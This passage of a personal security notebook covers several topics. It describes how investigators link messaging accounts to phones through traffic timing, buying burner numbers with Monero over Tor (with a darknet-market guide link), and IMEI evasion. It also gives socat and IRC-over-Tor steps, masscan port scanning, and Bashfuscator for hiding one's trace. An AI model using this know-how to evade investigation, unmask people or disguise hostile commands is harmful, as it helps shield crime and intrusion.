<li>Contents or metadata of files on your phone</li>
<li>Location data</li>
<li>Contents of your SMS messages</li>
<li>Your browsing history</li>
<li>And more</li>
</ol>
<p>Number 9 is how the police attaches real names to pseudonyms in IM (instant messaging) applications. Most people also use their real phone number on Telegram/Signal. Those that do have burner phones/numbers have non existent OpSec (operational security) beyond that. They use their burner at their home or at work, at their friends place. They have their burner turned on while their regular phone is turned on like while driving down a highway or in a bar. Sitting in a restaurant, turning off your phone and turning on the burner is not sufficient OpSec either.</p>
<p>When the company does not have to comply with law enforcement the process of identifying a person behind an account is more involved but perfectly doable.
Process looks roughly like this:</p>
<ol>
<li>Identify account you want to investigate.</li>
<li>Identify IP addresses of the servers that IM app clients connect to.
3a. Start conversation with account under investigation. Each message the suspect sends to you corresponds with upload traffic from a phone to the server identified in step 2. The timestamps of them sending a message and you receiving a message will correlate. Do this however many times needed and you have a match.
3b. Each message you send will correlate with a download by the suspect's phone. These will be time correlated if the suspect is currently online.
3b. Send a file of known size to suspect. This will stand out among all of the other single message uploads/downloads.
3c. Start a video/voice connection with suspect. This will correspond with a data stream of known duration and size.
3d. If suspect is not talking to you then you can use &quot;message read&quot; notifications that will be uploaded by the suspect or &quot;person is writing a message&quot; notifications that will be downloaded by the suspect. Initiating a voice or video connection request can also be correlated. You sending a message will not work if the person is not currently online but it can be used if you use the &quot;message read&quot; notification on your side and the corresponding download of the message by the suspect.</li>
</ol>
<p>The more people that the suspect gets to hide in the more data you need to identify the suspect. Of course you try to narrow down the geographic location of the suspect to make this process quicker.</p>
<p>TEMPORARY PHONE NUMBER</p>
<p>This will be used to activate an account. Beware that this number is temporary and you get it for just a few minutes. After that it is gone and you can not get it back. People can use it to steal your account. Some services want to verify you with the phone number again when you log in from a new place (happens if you use Tor), set up a 2FA authentication with those services. Use the Google authenticator app if available. Second option is e-mail authentication. Remember that every process must be done through tor. If you use the service through Tor but used the email without it at any point then you are screwed forever.</p>
<ol>
<li>Set up tails. The DNM Bible is down right now but you can find the offline version here as a PDF dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/post/40c86816505155c1a0d8</li>
<li>Buy Monero. If you need to then buy BTC with Monero (also in the bible). You must send the crypto transactions over Tor.</li>
<li>You can buy phone numbers here textverified.com or here 5sim.net or any other service that you'd prefer. They must accept crypto.</li>
</ol>
<p>You might tie all of your activated accounts together that you activate with purchases with the same account on one of these websites. Same if you make purchases with BTC from the same Bitcoin account, the BTC connection is across websites and their accounts. This depends on the website keeping these logs but you can not assume or trust that they don't. If an account on one of these number selling websites is ever identified as yours then all activations that you do with it in the future will be tied to you.</p>
<p>TOR HOSTILE WEBSITES</p>
<p>This is for completeness sake. I don't know exactly how to do it just that it is possible. You need to route your traffic like this you-&gt;tor-&gt;proxy-&gt;website.</p>
<p>You'll have to buy a proxy server with Monero. Or buy a VPS and configure a proxy yourself. If anyone has a good guide on how to do this then I'd appreciate it.</p>
<p>PHONE IMEI and SIM</p>
<p>All phones have a unique identification number, IMEI. It gets sent when you connect to a cell tower. You can't change IMEI on most phones anymore, you need to develop a custom solution for every phone. Mobile service providers keep track of IMEI numbers. When they saw them, the geographic location and the SIM that was present. IMEI ties together different SIM cards used on a phone. Some people are under the impression that the SIM is important and throwing out or changing the SIM is what saves them. The SIM is tied to your name and it is what enables service providers to bill people.</p>
<p>Some apps on your phone will have access to your IMEI. If the network operator knows the IMEI and through some app an IMEI is identified as belonging to you the suspect then that might lead to an arrest.</p>
<p>If you do not want an IMEI being associated with you then buy your phone with cash in some place that you are not easily identified. NEVER connect to a cell tower. If you make an emergency call then that will broadcast your IMEI. Airplane mode is a software switch, it doesn't actually turn off the antenna. There is no guarantee that your phone will not try to connect to a cell tower even with no SIM in phone. Same goes for airplane mode. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="joining-irc-server-through-tor"><a class="header" href="#joining-irc-server-through-tor">Joining IRC Server through tor</a></h1>
<p>So this tutorial is for the newbies out here that ask me how they can anonymously join IRC servers without leaking your IP Address or personal information about you. If set up properly, IRC can be one of the most secured way of sending messages out here just make sure your IRC server is using SSL protection or else your message won't be encrypted when sent, another good alternative could potentially be <a href="https://app.wire.com">wire</a>.</p>
<h2 id="installing-requirements"><a class="header" href="#installing-requirements">Installing Requirements</a></h2>
<p>The way we will be using requires a couple of requirements so we can join properly. First we will need to install these requirements, which will be used to connect to IRC servers anonymously.</p>
<p>On Debian based systems :</p>
<pre><code>$ sudo apt-get update &amp;&amp; sudo apt-get upgrade
$ sudo apt-get install tor socat irssi
</code></pre>
<p>On Arch Linux :</p>
<pre><code>$ sudo pacman -Syu tor socat irssi
</code></pre>
<h2 id="connecting-to-a-irc-server"><a class="header" href="#connecting-to-a-irc-server">Connecting to a IRC Server</a></h2>
<p>As an example we will connect to my IRC server at irc.reversing-ninja.com, but we will join through the onion address instead at ninjawafrnb67wn66umufhjwaddmcklk2tn2a7t2cok2pl43jjzkvead.onion.</p>
<p>The following command will start a listener on port 4229 and redirect the data received to the address ninjawafrnb67wn66umufhjwaddmcklk2tn2a7t2cok2pl43jjzkvead.onion:6697 using socksport 9050, which is the port on which tor runs by default.</p>
<pre><code>$ socat TCP4-LISTEN:4229,fork
SOCKS4A:localhost:ninjawafrnb67wn66umufhjwaddmcklk2tn2a7t2cok2pl43jjzkvead.onion:6697,socksport=9050
</code></pre>
<p>Before attempting to connect, always make sure tor is running first, for this use the following command.</p>
<pre><code>$ sudo systemctl start tor
</code></pre>
<p>Then the final step, you can start irssi and log in to the server.</p>
<pre><code>$ irssi
&gt;&gt; /connect -ssl localhost 4229
</code></pre>
<p>:)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="docker-tricks"><a class="header" href="#docker-tricks">Docker Tricks</a></h1>
<p>Docker is completely awesome, and since im quite new to it, i decided i was going to make myself some notes on it so i can remember the commands properly.</p>
<h2 id="starting-a-ubuntu-container"><a class="header" href="#starting-a-ubuntu-container">Starting a Ubuntu Container</a></h2>
<p>Starting a container in docker is something pretty simple, for this we just need a single command. In our case since we want to start a Ubuntu container we'll use one of the following commands.</p>
<pre><code>For the latest ubuntu version
$ sudo docker run -it ubuntu 

For a specific ubuntu version add a colomn with the version number
$ sudo docker run -it ubuntu:18.04
</code></pre>
<h2 id="restore-an-accidentally-exited-a-container"><a class="header" href="#restore-an-accidentally-exited-a-container">Restore an accidentally exited a container</a></h2>
<p>It sometimes happens that you quit a container without actually wanting to, you can restore the container with 2 really simple commands.</p>
<pre><code>$ sudo docker start $(sudo docker ps -q -l)
$ sudo docker attach $(sudo docker ps -q -l)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scan-ports-faster-than-most-using-masscan"><a class="header" href="#scan-ports-faster-than-most-using-masscan">Scan Ports faster than most using masscan</a></h1>
<p>nmap might be the greatest tool for deep and detailed port scanning, however it's pretty slow, and when you are hacking in competition you usually need to be fast.</p>
<p>So here comes masscan, this tool will scan every ports available on a machine (TCP/UDP) and do this 5-10x faster than a full nmap scan would, however note that nmap scans tends to give much more information that masscan.</p>
<pre><code class="language-bash">$ masscan -p1-65535,U:1-65535 --rate=1000 -e tun0
</code></pre>
<p>The preceeding command will scan for UDP and TCP ports on port 1 to 65535 with a rate of 1000 packets per second and all this will be done on the adapter named tun0.</p>
<p>I always like to specify the adapter name, just in case masscan decide to start the scan inside the wrong network.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bashfuscator"><a class="header" href="#bashfuscator">Bashfuscator</a></h1>
<p>Bashfuscator is a modular and extendable Bash obfuscation framework written in Python 3. It provides numerous different ways of making Bash one-liners or scripts much more difficult to understand. It accomplishes this by generating convoluted, randomized Bash code that at runtime evaluates to the original input and executes it. Bashfuscator makes generating highly obfuscated Bash commands and scripts easy, both from the command line and as a Python library.</p>
<p>It is HIGHLY useful on most red-teaming operations, and i highly encourage people to obfuscate their trace as much as they can, using obfuscated scripts is a good starting step.</p>
<p><em>Note that everytime you run the program you will have a newly random generated obfuscated bash script, if you want a small one you may have to run bashfuscator multiple times until you have a payload with the size you want.</em></p>
<p>Bashfuscator can be found on github at the following <a href="https://github.com/Bashfuscator/Bashfuscator">link</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="working-with-socketio"><a class="header" href="#working-with-socketio">Working with socket.io</a></h1>
<p><strong>Websockets</strong> is a technology that provides real time communication between a client and a server via a TCP connection, eliminating the need for customers to continuously check wether API endpoints have updates or new content. Clients create a single connection a WebSocket server, and wait to listen to new server events or messages.</p>
<p>The main advantage of WebSockets is that they are more efficient because they reduce the network load and send information in the form of messages to a large number of clients.</p>
<p>Among the main features of WebSockets, we can highlight the following :</p>
<ul>
<li>They provide bidirectional (full duplex) communication over a single TCP connection</li>
<li>They provide real-time communication between a server and its connecting clients. This enables the emergency of new applications oriented toward managing events asynchronously.</li>
<li>They provide concurrency and improve performance, optimizing response times and resulting in more reliable web applications.</li>
</ul>
<h2 id="implementing-a-server-with-socketio"><a class="header" href="#implementing-a-server-with-socketio">Implementing a server with socket.io</a></h2>
<p>To implement our server based on socket.io, we need to introduce other modules like <strong>asyncio</strong> and <strong>aiohttp</strong>.</p>
<ul>
<li><strong>asyncio</strong> is a Python module that helps us to do the concurrent programming of a single thread in Python. It's available in Python 3.7 - the documentation is available <a href="https://docs.python.org/3/library/asyncio.html">here</a>. </li>
<li><strong>aiohttp</strong> is a library for building server and client application built in <strong>asyncio</strong>. The module uses the advantages of WebSockets natively to communicate between different parts of the application synchronously. The documentation is available <a href="http://aiohttp.readthedocs.io/en/stable">here</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
